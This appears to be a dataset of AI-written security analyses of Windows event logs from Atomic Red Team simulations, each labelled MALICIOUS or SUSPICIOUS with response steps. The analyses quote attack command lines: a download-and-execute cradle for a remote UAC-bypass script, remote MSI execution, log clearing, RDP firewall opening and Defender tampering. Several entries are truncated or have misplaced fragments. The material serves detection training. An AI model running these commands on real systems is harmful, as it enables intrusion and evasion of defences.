- Review access logs and network traffic to identify potential exfiltration or lateral movement within the network.
- Reinforce security measures such as enabling audit policies, restricting the use of high-privilege accounts, and ensuring proper segmentation of network access."
Indirect Command Execution - conhost.exe,"Upon reviewing the provided Windows event logs, a few activities stand out as potentially suspicious and warrant further investigation:

1. **Event Log Clearing**:
   - **Security Log** (Event ID 1102) and **System Log** (Event ID 104): Both logs indicate the event logs have been cleared by the user `admin_test`. This is a common tactic used by malicious actors to cover their tracks after intrusive activities. It's a red flag and warrants further investigation into the administrator's actions around this timestamp.

2. **Usage of `wevtutil.exe`**:
   - Multiple instances of `wevtutil.exe` are observed, including command lines such as `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, `wevtutil.exe cl Application`, `wevtutil.exe cl System`, and `wevtutil.exe cl Security`. This utility is used to clear event logs and is an immediate cause for concern following the clearing of the event logs.

3. **Invocation of `cmd.exe` for Non-standard Operations**:
   - The `cmd.exe` is executed with the command line `cmd.exe /c conhost.exe ""notepad.exe""`, which appears unusual. The use of command shell commands to execute GUI applications or other binaries indirectly can be indicative of malicious automation scripts.

4. **Process Integrity**:
   - Many processes are executed with `IntegrityLevel` set to `High`, which suggests they have administrative privileges. Coupled with suspicious activities such as log clearing, this elevates the risk level considerably.

5. **Presence of `sppsvc.exe`**:
   - The execution of `sppsvc.exe` (Software Protection Platform Service) under `NT AUTHORITY\\NETWORK SERVICE` without context can be benign, but in the context of other suspicious activities, it deserves a closer look for unauthorized actions or permissions modification on the system.

6. **System Time Adjustment**:
   - Multiple timestamps indicate alterations in system time adjustments (`EventID: 4616`). While this can be part of legitimate updates or synchronization procedures, combined with the event log clearing shortly after, it raises the suspicion of potential tampering.

**Assessment & Guidance**:
Based on the observed activities, particularly the clearing of event logs using `wevtutil.exe`, the invocation of a command shell with confusing arguments, and evidence of potential system tampering, this collection of events suggests possible malicious activity or at least highly suspicious behavior. These require further forensic investigation.

**Resolution**: SUSPICIOUS

**Next Steps**:
- Conduct a thorough investigation of the `admin_test` account activities, accessing the system logs and file changes during the relevant time period.
- Verify all applications and scripts initiated by `wevtutil.exe` and `cmd.exe` during the suspicious timeframe.
- Review the integrity and security configurations of the CEO's machine, especially focusing on any newly installed software or privileges granted.
- Increase monitoring for similar activities across all systems to detect any expansion of potentially malicious activity."
Activate Windows NoRun Group Policy Feature,"Upon reviewing the provided Windows event logs, several suspicious activities have been noted, which could potentially indicate malicious behavior. Here's a detailed analysis:

1. **Process Creation and Execution:**
   - Multiple executions of `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `cmd.exe`, and `reg.exe` from the `admin_test` user are observed. While these processes can be legitimate when used occasionally, the frequency and context here are concerning.
   - The creation of registry keys using `cmd.exe` to modify `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer` with a `NoRun` value is suspicious. This indicates potential policy changes to restrict user actions.
   - The use of `wevtutil.exe` to clear event logs (System, Application, Security, and Windows PowerShell) suggests an attempt to cover tracks.

2. **Log Clearing:**
   - Several `EventID 1102` and `EventID 104` entries in the logs indicate the clearing of event logs. This action is typically executed to remove evidence of unauthorized activities or compromise.
   - The logs show actions taken under the `admin_test` user to clear logs, which aligns with potential malicious intentions to hide activity.

3. **Time Manipulation:**
   - There is evidence of time manipulation as shown by the `EventID 4616`, where system time was changed by a process running under `LOCAL SERVICE`. This could be an attempt to confuse logging mechanisms or anti-forensic efforts.

4. **Unusual Parent-Child Process Relationships:**
   - The parent process of some entries is `wsmprovhost.exe` with the `-Embedding` argument, which is typically used in remote management and automation scenarios. The unusual number of different system binaries being spawned from this could suggest misuse.

5. **High Integrity Level Execution:**
   - Many suspicious activities are carried out with ""High"" integrity level, which provides elevated permissions. This could be an indication of privilege misuse or escalation.

Given the suspected registry modifications, log clearing activities, possible track-covering efforts, and time tampering, the behavior observed in the logs is indeed suspicious and potentially indicative of a compromise. The actions performed, particularly by the `admin_test` user, deviate from standard operational behavior.

**Resolution: SUSPICIOUS**

**Recommendations:**
- Conduct a thorough investigation to determine the user's legitimacy and intentions behind these actions.
- Inspect the affected system for potential malware or unauthorized access.
- Review account activities associated with `admin_test` and consider resetting the password or disabling the account temporarily.
- Alert the IT team to monitor similar activities across other systems to prevent widespread incidents.
- Ensure system integrity checks and incident response plans are in place to manage potential escalation of this situation."
Creating W32Time similar named service using sc,"Upon reviewing the provided event logs, here are the key findings:

### Suspicious Behavior:

1. **Log Clearance Activities:**
   - Multiple instances of log file clearance events are observed:
     - **System Log Cleared:** By user `admin_test`.
     - **Windows PowerShell Log Cleared:** By user `admin_test`.
     - **Security Log Cleared:** By user `admin_test`.
   - These events (Event ID 104 for System, Event ID 1102 for Security) are common techniques used by attackers to cover their tracks after malicious activities.

2. **Unusual Service Creation:**
   - A service named `win32times` was created with the command:
     - `cmd /c start c:\\T1036.004_NonExistingScript.ps1`
   - The service uses a non-existing script which is suspicious. Such activity may indicate an attempt to obfuscate or create a placeholder for running potentially malicious PowerShell code.

3. **Wevtutil Usage:**
   - The process `wevtutil.exe` is used to clear the various logs, as indicated in multiple Sysmon Event ID 1 events. This tool is typically used for managing event logs and is leveraged here for log clearance, which aligns with malicious intentions.

4. **Elevation of Privileges:**
   - Commands executed under `High Integrity Level` using `cmd.exe`, `sc.exe`, `whoami.exe`, and other utilities may indicate privilege escalation or an attempt to execute commands with elevated privileges, typical of malicious behavior.

### Indicators of Malicious Activity:
   
- The coordinated actions of log clearing, service creation with a placeholder script name, and subsequent processes running under an administrative user (`admin_test`) indicate a high likelihood of compromise.

### Assessment:

- Based on the analysis of the logs and the observed activities, the resolution of the investigation is classified as **MALICIOUS**. The combination of log clearance with system changes using administrative privileges points to attempts to mask malicious activities.

### Guidance on How to Proceed:

1. **Immediate Containment:**
   - Isolate the affected system (`Server002`) to prevent any potential spread of infection.

2. **Detailed Forensic Analysis:**
   - Perform a thorough forensic analysis on `Server002` to uncover any additional indicators of compromise, such as unauthorized scheduled tasks, further unexpected services, or unknown executables.
   
3. **Change Credentials:**
   - Immediately reset passwords for the user `admin_test` and any associated accounts due to the potential compromise of credentials.

4. **Log Monitoring and Retention:**
   - Enhance logging policies to ensure higher retention and monitoring of logs.
  
5. **Review System Access Controls:**
   - Reassess the access controls in place for critical accounts, especially those with administrative privileges.

By addressing these steps, further harm may be mitigated, and future occurrences can be prevented."
Open a local port through Windows Firewall to any profile,"After a thorough investigation of the provided Windows event logs, several suspicious activities can be noted:

1. **Process Creation and Log Clearing by 'admin_test'**:
   - Multiple instances of `wevtutil.exe` were used to clear event logs for the Sysmon, Application, Security, System, and PowerShell channels. This was executed by the user `SERVER002\admin_test` and accompanied by instances of `conhost.exe` as child processes.
   - Clearing event logs using `wevtutil.exe` can be an indicator of malicious behavior, particularly in combination with elevated privileges (High Integrity Level).

2. **PowerShell Execution**:
   - A PowerShell command was executed with the intent to add a firewall rule to open port 3389 (commonly used for RDP) to any connection. The command line included:
     ```
     powershell.exe & {netsh advfirewall firewall add rule name=""Open Port to Any"" dir=in protocol=tcp localport=3389 action=allow profile=any}
     ```
   - This action is highly suspicious, as it attempts to modify firewall settings to expose a common management port, possibly for remote access.

3. **Initiation of Unauthorized Services**:
   - The execution of `svchost.exe`, a service host process, suggests potential misuse or abuse of Windows services which is often a tactic used to persist unauthorized activities.

4. **Edge Update-related Activity**:
   - Numerous entries related to Microsoft's Edge Update are present, indicating potential software updates. However, these seem benign and consistent with legitimate update operations initiated by the `NT AUTHORITY\SYSTEM`.

Given the combination of these findings:

- Opening RDP port access through firewall rule modification without prior change request or authorization is a typical indicator of a potential compromise.
- The use of `wevtutil` to clear logs consistent with attempts to hide malicious activity is a strong red flag.
- Overall, these actions require immediate attention as they indicate possible unauthorized access or compromise.

**Assessment and Resolution**: Based on the evidence of using PowerShell to manipulate firewall rules for opening a critical port and the clearing of logs, I assess the situation as **MALICIOUS**.

**Guidance on Proceedings**:
- Immediately investigate the origin of the log manipulations and PowerShell commands. Verify if `admin_test` account actions were legitimate.
- Check network logs for any new inbound connections on port 3389 and any suspicious network activity from the server.
- Isolate the affected system from the network to prevent further unauthorized access.
- Perform a comprehensive security audit and malware scan to identify any backdoors or undocumented changes.
- Consider resetting credentials for the `admin_test` account and any accounts that might have been compromised.
- Implement additional monitoring and review group policies to prevent unauthorized actions, such as log clearing and unauthorized remote access."
Abusing Windows TelemetryController Registry Key for Persistence,"Upon reviewing the provided logs, several indicators suggest potentially suspicious and malicious activity on the system:

1. **Log Clearing Activities**:
   - Multiple entries under the System and Security logs show that logs have been cleared:
     - The System log shows the ""admin_test"" user clearing both the System and Windows PowerShell channels around ""2024-10-24 20:23:12"".
     - The Security log (Event ID 1102) indicates clearing of security event logs by the same user ""admin_test"" with logon ID ""0x13A983"".
   - Log clearing is a common tactic used by malicious actors to cover their tracks post-compromise.

2. **Suspicious Command Executions**:
   - Sysmon logs show suspicious use of the `wevtutil.exe` tool to clear logs, which is a legitimate tool used in a potentially malicious manner ('CommandLine':'""C:\\Windows\\system32\\wevtutil.exe"" cl [ChannelName]'), causing context loss for recent operations.
   
3. **Registry Modification**:
   - The logs capture `cmd.exe` executing a command to add registry entries:
     - `""cmd.exe"" /c reg add ""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\NewKey"" /t REG_SZ /v Command /d C:\\Windows\\System32\\notepad.exe /f`
   - The addition of registry entries related to telemetry could suggest attempts to establish persistence or modify system behavior.

4. **Process Execution Context**:
   - The activities were performed under the ""admin_test"" user in a high integrity context, suggesting either abuse of administrative privileges or compromise of a privileged account.

5. **Unusual Process Associations**:
   - Common system utilities (`hostname.exe`, `whoami.exe`) are followed by shell hosts (`conhost.exe`) which could be indicative of command execution chains linked to an interactive session or misuse.
   - Frequent process execution and termination patterns involving Microsoft Edge Update processes observed in the Sysmon log, which may or may not be related to a legitimate software update.

### Assessment:

The combination of log clearing activities, suspicious command execution, and unauthorized registry modifications strongly indicates potentially malicious activity. Furthermore, these activities are consistent with typical indicators of compromise (IOCs) such as log tampering and escalation of privileges.

UACME Bypass Method 56,"Upon analyzing the provided Windows event logs, a sequence of events suggests potential malicious activity on the system, specifically related to unauthorized log clearing and suspicious command executions.

### Analysis Highlights:

1. **Suspicious Process Execution:**
   - The Sysmon log indicates the execution of `cmd.exe` with the command line involving `Akagi64.exe`, a part of UAC (User Account Control) bypass tools often utilized in privilege escalation attacks.
   - The process `Akagi64.exe` is executed from an unusual directory: `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\\ExternalPayloads\\uacme`.
   - The `cmd.exe` was invoked with high integrity, suggesting it was running with elevated privileges, potentially manipulated for executing unauthorized tasks.

2. **Event Log Clearing:**
   - Multiple logs (Sysmon, Security, and System) show entries indicating cleared event logs which is typically a suspicious activity aimed at erasing traces of unauthorized actions on the system.
   - Event ID 1102 in the Security log indicates the security log was cleared by the user `admin_test`, and Event ID 104 in the System log shows both the System and Windows PowerShell logs were cleared.
   - The timing of these log clearings coincides with the execution of suspicious processes.

3. **Repeated Execution of Eventing Command Line Utility (`wevtutil.exe`):**
   - The Sysmon logs record multiple invocations of `wevtutil.exe` with the `cl` (clear) argument intended to clear various event logs like Application, System, and Security.
   - This further corroborates attempts to remove activity traces from the machine.

4. **Utilization of Known UAC Bypass Tool:**
   - The presence of `Akagi64.exe` linked to the `uacme` tool suite indicates the potential use of UAC bypass techniques, a common method used by attackers to escalate privileges stealthily.

### Final Assessment:
Based on the sequence and nature of events captured in the logs, it is highly indicative of malicious activity aimed at privilege escalation and covering tracks by clearing logs. The combination of unusual command line usage, execution of known bypass tools, and event log clearing is consistent with standard stages of an attack lifecycle.

Tamper Win Defender Protection,"Upon detailed examination of the provided Windows event logs, several incidents raise concerns about potentially malicious activity:

### Key Observations:

1. **Log Clearance by `admin_test`:**
   - Multiple event logs (Security, System, Windows PowerShell) have been cleared using the `wevtutil.exe` command by the `admin_test` user at around the same time. This is indicated by Event ID 1102 in both Security and System logs and multiple Sysmon Event ID 1 logs showing wevtutil.exe execution.
   - The use of `wevtutil.exe` for clearing logs (`CommandLine` field showing `cl` argument) is suspicious as threat actors often clear event logs to cover their tracks.

2. **Time Manipulation:**
   - There are Kernel-General logs (Event ID 1) showing time changes shortly after log clearance activities. Time manipulation can sometimes be used to bypass security mechanisms or to align system and attacker times.

3. **Registry Modification:**
   - A command was executed via `cmd.exe` to modify the Windows registry setting to disable Windows Defender’s Tamper Protection. This operation (`CommandLine` field shows registry modification using `reg.exe`) is highly suspicious as it attempts to weaken system defenses, a common tactic for attackers seeking persistence or evasion.

4. **Process Execution Chain:**
   - The execution of processes like `cmd.exe` and `reg.exe` following the clearance of logs is suspect. The specific registry modification to disable a critical security feature further supports malicious intent.

5. **Lack of Legitimate Activity Justification:**
   - There is no accompanying legitimate activity or system updates that typically justify such registry changes or log clearance. The context is purely administrative without any routine maintenance indicators.

6. **Microsoft Edge Updates:**
   - Numerous instances of `MicrosoftEdgeUpdate.exe` appear, but these mainly correspond to typical application updates and do not exhibit further indicators of compromise given their processes and parent-child relationships.

### Threat and Risk Assessment:

- **Indicators of Compromise (IOC):**
  - Log clearance using `wevtutil.exe`.
  - Registry modification to disable security features.
  - Unjustified time adjustments within critical timeframes of suspicious activities.

- **Threat Level:**
  - The activities observed represent clear attempts at obfuscation and potential preparation for lateral movement or privilege escalation by disabling security features.

### Resolution:

**MALICIOUS**: The logs provide clear indicators of malicious activities, such as unauthorized log clearances and registry modifications disabling security features without benign justification. Immediate containment and response actions are advised.

### Recommended Actions:

1. **Isolate the Host:**
   - Immediately isolate the affected host (Server002) to prevent further compromise and lateral movement.

2. **Credentials Security:**
   - Reset credentials for `admin_test` and review similar account security.

3. **Incident Response:**
   - Conduct a comprehensive incident response and forensic analysis to understand the scope and impact.
   - Review other systems for similar indicators of compromise.

4. **Security Policy Review:**
   - Audit access logs and administrative activities.

Control Panel Items,"After a comprehensive analysis of the provided event logs, I have identified several indicators of potentially malicious activities. Let's break down the findings:

### Analysis of Suspicious Activities:

1. **Event Log Clearing**:
   - The security log (`EventID: 1102`), system log, and Windows PowerShell logs show evidence of being cleared (`EventID: 104`). The activities all tied to the username `admin_test` on `SERVER002`, which is a red flag as clearing event logs can indicate an attempt to cover up malicious activities.

2. **Suspicious Command Execution**:
   - Execution of `wevtutil.exe` is observed with `cl` (clear) commands across multiple logs, including Security, System, and Application logs. This is typically used to clear event logs and, in combination with the log clearing entries, suggests an effort to remove traces of activity.

3. **Unusual Process Executions**:
   - The execution of Windows utilities like `whoami.exe`, `hostname.exe`, and suspicious calls like `cmd.exe /c control.exe` handling files under `AtomicRedTeam`, which is associated with adversary simulation tools used in security testing, can be suspicious in nature.
   - The `rundll32.exe` execution with `calc.cpl` is linked to a known technique for executing payloads or abusing Windows utilities (technique T1218.002).

4. **Command Line Arguments**:
   - Use of command lines with `calc.cpl`, particularly from the `Temp` directory with specific references to `AtomicRedTeam`, could indicate the running of test simulations or potentially malicious scripts mimicking legitimate activity.

5. **Multiple Instances of Edge Update**:
   - A significant number of logs refer to `Microsoft Edge Update`, which by itself may not be suspicious. However, given the context of trying to cover activity (log clearing), this could be used to mask real activity under normal system processes.

### Assessment of the Situation:

Given the evidence from the event logs, the behavior of the user `admin_test`, the log clearing actions, and the use of known suspicious command-line patterns (associated with techniques in adversary simulation), these activities collectively represent suspicious behavior. This may not definitively indicate malicious activity on its own, but it requires further investigation to determine whether the activity is part of a legitimate internal security exercise or an actual compromise attempt.

### Recommended Actions:

1. **Deep Investigations**: 
   - Verify if the operations are part of authorized internal testing (such as Red Team exercises) to avoid false positives.
   - Analyze user `admin_test` activities and correlate with expected behavior or roles.

2. **Containment**:
   - Temporarily isolate `SERVER002` to prevent potential lateral movement within the network until further determination of the threat level.

3. **Forensics and Analysis**:
   - Conduct a thorough forensic analysis of the involved system and examine other system logs correlated around the same period for unauthorized access or data exfiltration attempts.

4. **Review and Monitoring**:
   - Enforce strict monitoring policies and alerting for similar activities, especially on high-value assets like the CEO’s machine.
   - Re-evaluate security measures, especially concerning account privileges and security log safeguarding. 

**Resolution**: **SUSPICIOUS**

The activity documented in the logs is suspicious and warrants a more detailed forensic investigation to establish the context and ensure the security of the environment."
WMI Win32_Product Class - Execute Local MSI file with an embedded EXE,"Upon reviewing the provided event logs, several indicators suggest suspicious activities on the host, Server002, particularly involving the user ""SERVER002\\admin_test."" Here is the detailed analysis:

### Suspicious Activities:
1. **PowerShell Usage:**
   - PowerShell is executed multiple times, highlighting a command that involves `Invoke-CimMethod` with `Install` method on MSI files located in a temporary directory, which might indicate exploitation or misuse of PowerShell for lateral movement or installing malicious software. The command is: `""powershell.exe"" & {Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.007\\bin\\T1218.007_EXE.msi' }}`.

2. **Event Log Clearing:**
   - There are several instances of event log clearing, indicated by Event IDs 1102 (Security log) and 104 (System and PowerShell logs). This action is frequently associated with attempts to cover up tracks after potentially malicious activities.

3. **Execution of `wevtutil`:**
   - A command-line utility `wevtutil.exe` executes multiple times with the ""cl"" (clear) argument to clear different logs (`Microsoft-Windows-Sysmon/Operational`, `System`, `Application`, `Security`). The process is initiated with elevated privileges, as the integrity level is ""High,"" which indicates possible privilege escalation or misuse of administrative privileges.

4. **Atomic Red Team Indicators:**
   - The execution of `.msi` files associated with ""Atomic Red Team"" is noted. These are part of cybersecurity frameworks used for simulations or penetration testing and indicate either a scheduled test/assessment or unauthorized similarity to malicious tactics.

5. **Miscellaneous Executables:**
   - Execution of other system utilities like `whoami.exe` and `hostname.exe` is not inherently malicious but can be used maliciously for footprinting or enumeration during unauthorized access.

### Malicious Indicators:
- The combination of executing management utilities for log file clearing and the professional usage of PowerShell to install potential unwanted software reflects tactics, techniques, and procedures (TTPs) aligned with sophisticated attacks, testing frameworks or red team exercises.
- Lack of contextual information to suggest any planned security testing or administrative tasks further supports the malicious nature of these actions.

### Resolution:
- **Resolution: MALICIOUS**

### Recommendations:
1. **Immediate Incident Response:**
   - Isolate the machine and conduct a comprehensive forensic investigation.
   - Recover any cleared security logs from backup or shadow copy if possible to determine the scope of activity.

2. **Audit Administrative Activities:**
   - Review user ""admin_test"" actions and any related privilege escalations or misuses. Scrutinize processes run during the timeframe of log clearing.
  
3. **Review and Update Security Policy:**
   - Enforce stricter access controls and logging policies, including protected logging to prevent unauthorized clearing.
   - Consider employing enhanced monitoring and alerting mechanisms for the execution of potential dual-use commands, such as those issued via PowerShell or event logging tools.

4. **Communication and Training:**

Documentation and archiving of this assessment should be made available for future audit, compliance, or post-incident analysis."
Disable Windows Toast Notifications,"The provided logs indicate several activities that happen within a short period of each other on the system identified as Server002. Here is a detailed analysis of the logs:

### Suspicious or Anomalous Behavior:
1. **Clearing of Event Logs:**
   - There are multiple instances of the `wevtutil.exe` utility being used with the `cl` (clear) command targeting various logs such as the Windows PowerShell, Application, System, and Security logs.
   - Notably, these events are associated with the user `admin_test`, which suggests a privileged account was used to perform these actions.

2. **Process Activity:**
   - Several sequences of `wevtutil.exe` executions are followed by `conhost.exe`. This could be typical behavior when logs are being cleared using command line utilities.
   - Execution of commands like `cmd.exe /c reg add ...` is observed, which modifies the registry to disable toast notifications. This sequence also involves utilities like `reg.exe`, all executed under the `admin_test` account.

3. **Account Activity:**
   - The security logs show that the `admin_test` account was involved in the clearing of security logs (EventID `1102`). Clearing security logs is usually a red flag as it may indicate an attempt to cover tracks on the system.

### Indications of Malicious Activity or Compromise:
- The combination of clearing logs using `wevtutil.exe` and executing commands such as disabling notifications through the registry without a clear, benign reason is typically associated with malicious intent.
- `admin_test` appears as the user for most activities, suggesting potential misuse or compromise of this administrative account.
  
### Assessment:
Based on this analysis, the pattern of frequent use of `wevtutil.exe` to clear logs, coupled with registry modifications under a high-integrity user context (`admin_test`), is highly indicative of an attempt to obfuscate activities on the system, which aligns with known malicious behavior patterns.

### Resolution:
- **MALICIOUS**: The logs reveal activities consistent with tactics often employed by attackers, such as log clearing and privilege abuse, especially conducted under an admin account. There is a strong likelihood of malicious activity.

### Guidance on How to Proceed:

3. **Post-Incident Review:**
   - Conduct a full review of the system configurations and ensure update patches are applied to close vulnerabilities.
   - Educate users about safe security practices and early signs of malicious activity.

This assessment and guidance should form the basis of an immediate security response to address the potential compromise of Server002."
Obfuscated Command in PowerShell,"Upon analyzing the provided logs, several events stand out as potentially suspicious and indicative of malicious activity:

1. **Log File Clearance**:
    - Multiple instances of event ID 104 and 1102 indicate that logs were cleared from the System, Windows PowerShell, and Security channels. This activity was conducted by the user `admin_test`. Clearing logs, especially without clear justification or valid administrative task, is typically a red flag. It suggests an attempt to cover tracks.

2. **PowerShell Activity**:
    - The PowerShell logs reveal the execution of obfuscated commands. The specific command involves using encoded strings and executing them, a common tactic in malicious scripts to avoid detection by traditional signature-based defenses. The commands involve complex PowerShell expressions and invocations that, when decoded, often result in malicious payloads execution.

3. **Sysmon and Security Events**:
    - There are numerous Sysmon entries involving the execution of `wevtutil.exe` associated with the same user (`admin_test`) clearing event logs. This corroborates events seen in the System and Security logs about log clearance.
    - The execution of `svchost.exe` and `wsmprovhost.exe` also appears suspicious when tied with PowerShell obfuscation, potentially indicating lateral movement or privilege escalation attempts.

4. **Indicators of Potential Privilege Escalation and Persistence**:
    - The presence of commands such as `whoami.exe` in conjunction with suspicious PowerShell activity can indicate reconnaissance efforts to establish user privileges and potentially escalate them.

**Assessment**:
These behaviors are highly indicative of malicious activity. The combination of log clearing, obfuscated PowerShell scripts, and administrative tool usage to cover tracks or manipulate logs suggests a deliberate attempt to execute unauthorized or harmful actions on the system.

**Resolution: MALICIOUS**:
Based on the evidence in the logs, it's clear that malicious activity occurred. A deeper investigation should be conducted immediately to identify potential breach points, contain any further compromise, and remediate systems. Steps should include:
- Isolating the affected system from the network to prevent any further spread or data exfiltration.
- Conducting a thorough forensic analysis to decode the PowerShell scripts and understand the payload or actions performed.
- Reviewing user credentials and accesses, especially for the `admin_test` account.
- Applying any necessary patches, enhancing monitoring, and considering changes to the security policy or configurations to prevent recurrence."
WinPwn - UAC Bypass DccwBypassUAC technique,"## Analysis of Logs

After analyzing the provided log entries across System, Security, PowerShell, Sysmon, and Application logs, I have identified several indicators that strongly suggest malicious activity on the machine. Below is a detailed breakdown of the suspicious and malicious activities observed:

### Indicators of Malicious Activity

1. **Event Log Cleared**: 
   - Multiple instances of the event logs being cleared (System EventID 104, Security EventID 1102), executed by user `admin_test`. This action is often associated with an attempt to hide malicious activities.

2. **Suspicious PowerShell Usage**:
   - Several PowerShell log entries (EventID 600) indicate the execution of obfuscated PowerShell commands via `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')`. This kind of operation is typical of malicious scripts attempting to download and execute further threat payloads.

3. **Process Anomalies**:
   - The `wevtutil.exe` utility, used for clearing event logs, was heavily utilized by the `admin_test` user across multiple process creations as recorded in Sysmon logs. Usage across different channels such as Sysmon/Operational and Security, as well as clearing the Windows PowerShell logs, indicates an attempt to cover tracks.

4. **Unauthorized Use of High Privilege Commands**:
   - Execution of `whoami.exe` and `hostname.exe` without clear business justification and in proximity to other suspicious activities, like log clearance and PowerShell misuse, further indicates a possible reconnaissance or privilege verification by an unauthorized entity.

5. **Time skewing**:
   - The Security and Kernel-General logs indicate a discrepancy in system time settings, with the time being set backwards. This is often indicative of attempts to manipulate time for evading detection based on timestamps.

### Conclusion

InstallUtil Install method call,"Upon analyzing the provided logs, I have identified several indicators of potentially malicious activity. Below is the breakdown of the analysis:

1. **Security Log Events:**
   - Event ID 1102 indicates that the security event log was cleared by the user ""admin_test"". Clearing of logs can often indicate an attempt to cover tracks after unauthorized activities.
   - The `wevtutil.exe` tool, which is used for clearing event logs, was executed several times (Sysmon Event ID 1). The command lines used are indicative: `wevtutil.exe cl Security`, `wevtutil.exe cl Application`, `wevtutil.exe cl System`, and `wevtutil.exe cl ""Windows PowerShell""`.

2. **PowerShell Activities:**
   - PowerShell script execution involves the usage of a script located in a path associated with `AtomicRedTeam`, a well-known security testing framework used for simulating attacker techniques (referenced as `T1218.004`). The use of test harnesses indicative of lateral movement or persistence mechanism tests, which are typical of penetration testing or actual attacks.
   - The invocation of potentially compiled code and the PowerShell command lines suggest actions tied to penetration testing or exploitation: `InstallUtil.exe` is executed to load a DLL, bypassing typical execution fences, which is associated with the `T1218.004` tactic.

3. **Sysmon Logs:**
   - Multiple processes created by `wevtutil.exe` for clearing logs.
   - Use of `InstallUtil.exe`, often leveraged by attackers to bypass application whitelisting defenses.

4. **Indicators of Suspicious Activity:**
   - Specific command line runs, such as `InstallUtil.exe` with command lines often seen in known attacks or tests (e.g., Atomic Red Team).
   - `wevtutil.exe` used for clearing critical logs, potentially covering up malicious activity.

5. **System and Application Logs:**
   - System logs indicate system and PowerShell logs were cleared.
   - The Edge update logs do not appear relevant to the specific threat but show standard operations.

Considering the above findings:

- The use of event log clearing techniques, indicative processes, and toolsets favored by adversaries, imply a high likelihood of malicious activity. Such activities include potential misuse or testing that aligns with red teaming tactics.
- However, the presence of `AtomicRedTeam` suggests this could be a part of a cybersecurity team operation or a benign testing scenario.

**Resolution: MALICIOUS**

Given the log clearing, combined with suspicious PowerShell and `InstallUtil.exe` executions, these activities strongly suggest it points towards malicious intent or serious misuse. These activities warrant an immediate investigation, direct confirmation from the involved parties, and a review of other indicators of compromise within the network. If this was conducted by an internal security team (as a test or exercise), validation and documentation should be confirmed to rule out actual malicious intent."
Scarab Ransomware Defense Evasion Activities,"Upon thorough analysis of the provided Windows event logs, several key observations can be made:

1. **Log File Clearing (Security Event 1102 and System Event 104):**
   - There are multiple instances of log files being cleared. This includes security, system, and Windows PowerShell logs, all being cleared by the user ""admin_test"". The clearing of logs, especially without a valid reason, is a red flag and could indicate an attempt to cover tracks post-compromise.
   
2. **Time Manipulation (Security Event 4616 and System Event 1):**
   - The time on the system was altered as seen in the logs. Unexpected changes in system time could indicate an attempt to disrupt timestamp-based alerts or correlation.
   
3. **Process Creation by wevtutil.exe (Sysmon Event ID 1):**
   - There are several entries of the process `wevtutil.exe` being used to clear event logs. This utility is typically used to manage Windows event logs and its use in rapidly clearing logs across different channels suggests malicious intent.

4. **Registry Modification via CMD and reg.exe (Sysmon Event ID 1):**
   - An instance is noticed where `cmd.exe` and `reg.exe` are used to modify registry keys related to `CredSSP`. This is potentially suspicious as it involves changes to security-related configurations. Unauthorized changes like this could lead to security risks or be indicative of lateral movement preparation or execution.

5. **Edge Update Process Activity:**
   - The Microsoft Edge Update process appears frequently in the logs. While multiple Edge Update processes and service starts are present, these may initially seem excessive, this could be normal behavior for Edge Update unless correlated with malicious activity. Currently, this behavior alone isn't inherently suspicious without external indicators of compromise.

**Assessment:**
The combination of cleared logs, unauthorized time changes, and registry modifications is enough to consider these actions as signs of suspicious behavior. While the Microsoft Edge Update activity might be normal update behavior, the other activities suggest potential malicious intent or an attempt to evade detection.

**Resolution: SUSPICIOUS**

**Guidance to Proceed:**
- Conduct a thorough investigation of the ""admin_test"" account for unusual behaviors, permissions, and recent changes.
- Implement stricter monitoring and alerting for log clearing events and time changes.
- Review the chain of custody for the `wevtutil.exe` and `cmd.exe` executions, and validate the necessity of registry modifications made.
- Consider running a full malware and rootkit scan on the host.
- Check for potential lateral movement solutions leveraged and block unauthorized access points.
- If feasible, restore from a known good backup before the suspicious activities began, after ensuring clean-up and security hardening measures are in place.
  
Further investigation and potentially coordination with incident response teams are recommended to determine the precise intent and mitigate any risks associated with these activities."

2. **Investigation and Recovery**:
   - Recover system logs from backups, if available, for further forensic investigation to identify additional malicious actions prior to log clearance.
   - Review and investigate user account activity, especially `admin_test`, to determine account compromise and enforce necessary password changes or MFA policies.

3. **Security Hardening and Monitoring**:
   - Implement stricter logging policies to prevent unauthorized log tampering (e.g., controlling access to `wevtutil.exe`).
   - Increase monitoring of PowerShell activities through enhanced logging (Script Block Logging) to identify potential future exploits or suspicious command executions.
   - Review and tighten user privilege settings across the domain to ensure least privilege principles are adhered to henceforth.

Immediate action following the above guidelines is crucial to secure the system and prevent further occurrences."
Msiexec.exe - Execute Remote MSI file,"### Detailed Analysis

1. **Sysmon Logs:**
   - **Process Execution and Anomalous Command Lines:**
     - Multiple instances of `wevtutil.exe` are run with the command `cl` (clear) against various logs including `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security`. This is suspicious because clearing event logs is often an indicator of an attempt to cover traces of malicious activity.
     - The execution of `cmd.exe` with command line using `msiexec.exe` to download and execute a script from `https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi` strongly indicates the execution of an Atomic Red Team (ART) test, which simulates adversary techniques. This was coordinated with `powershell.exe` run with `-nop -Command`, which points toward script execution without presentation mode, common in attacks for malware or scripts designed to evade detection.
   
2. **Security Log:**
   - **Event ID 1102 (Log Cleared):**
     - This event confirms that the Security log was cleared by `admin_test`. Clearing security logs is a critical red flag as it points to attempts to erase traces of actions taken by a user or malware.
  
3. **Windows PowerShell Logs:**
   - **Events Indicating Malicious or Simulated Activity:**
     - The execution of PowerShell with commands embedded as `Write-Host JScript executed me!; exit` confirms the execution of potentially harmful scripts often used in testing or real attacks. These logs show the initiation and termination of PowerShell provider engines typically seen when scripts are executed.
   
4. **System and Application Logs:**
   - **Log Clearance and Application Execution:**
     - Events confirming the clearance of system logs reinforce the suspicious nature of activity on this machine. It is combined with installation and execution of scripts as seen from `MsiInstaller` logs, which points towards potentially harmful operations being cleared from standard logs, potentially masking further events unless Sysmon or similar solutions are capturing detailed information.

5. **Edge Update Activity:**
